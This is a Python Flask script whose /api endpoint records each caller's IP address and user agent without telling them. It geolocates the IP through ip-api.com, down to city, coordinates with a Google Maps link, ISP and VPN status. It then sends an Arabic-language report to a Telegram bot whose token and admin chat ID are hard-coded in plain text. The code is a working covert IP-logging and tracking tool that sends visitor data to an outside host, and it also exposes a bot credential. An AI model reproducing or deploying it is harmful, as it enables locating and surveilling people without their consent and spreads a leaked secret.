import requests
from flask import Flask, request, jsonify
from flask_cors import CORS

app = Flask(__name__)
CORS(app)

BOT_TOKEN = "6727442156:AAE2vb10whFbgap9RvikV3uNHVJCrUv6LlY"
ADMIN_ID = "2109115442"

def send_to_telegram(msg):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    try:
        requests.post(url, json={"chat_id": ADMIN_ID, "text": msg, "parse_mode": "Markdown"}, timeout=5)
    except:
        pass

@app.route('/api', methods=['GET', 'POST'])
def universal_api():
    try:
        ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]
        geo = requests.get(f"http://ip-api.com/json/{ip}?fields=status,country,city,lat,lon,timezone,isp,proxy,query").json()
        ua = request.headers.get('User-Agent', 'Unknown Device')

        report = (
            f"🚀 **إشعار استدعاء عالمي**\n"
            f"━━━━━━━━━━━━━━━\n"
            f"📍 **IP:** `{ip}`\n"
            f"🌍 **الموقع:** `{geo.get('country')} - {geo.get('city')}`\n"
            f"📡 **الخريطة:** `https://www.google.com/maps?q={geo.get('lat')},{geo.get('lon')}`\n"
            f"🏢 **الشركة:** `{geo.get('isp')}`\n"
            f"🛡️ **VPN:** `{'Yes' if geo.get('proxy') else 'No'}`\n"
            f"📱 **الجهاز:** `{ua}`\n"
            f"━━━━━━━━━━━━━━━"
        )
        
        send_to_telegram(report)
        return jsonify({"status": "success", "ip": ip, "geo": geo}), 200

    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
